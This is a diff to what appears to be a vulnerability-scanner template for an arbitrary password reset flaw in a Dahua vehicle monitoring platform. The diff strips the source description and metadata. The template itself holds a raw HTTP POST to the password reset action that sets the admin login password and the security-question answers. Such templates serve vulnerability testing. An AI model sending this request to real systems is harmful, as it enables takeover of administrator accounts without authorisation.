@@ -3,12 +3,8 @@ info:
   name: 大华车载监控平台任意密码重置漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dc7if8z57dftkkxl'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dc7if8z57dftkkxl
-    fofa: 暂无
 http:
 - raw:
   - 'POST /config/user_passwordReset.action?nowTime=1662449299721 HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Cookie: JSESSIONID=8EFCAC96D2EEF42CA0F7ACA18C491016; random=7j0fstzufuu; JSESSIONID=A6683C873CB8549B04A50677BE1BA39A
-
-
 
 
     userBean.loginName=admin&userBean.loginPass=%24D%24S%24S%240778d46eadf8a31cb00ce8d1be64e12e&userBean.questionNumber1=6&userBean.questionAnswer1=1d0383dcf3670a5ea80b017382d66623&userBean.questionNumber2=1&userBean.questionAnswer2=1d0383dcf3670a5ea80b017382d66623&userBean.questionNumber3=7&userBean.questionAnswer3=1d0383dcf3670a5ea80b017382d66623
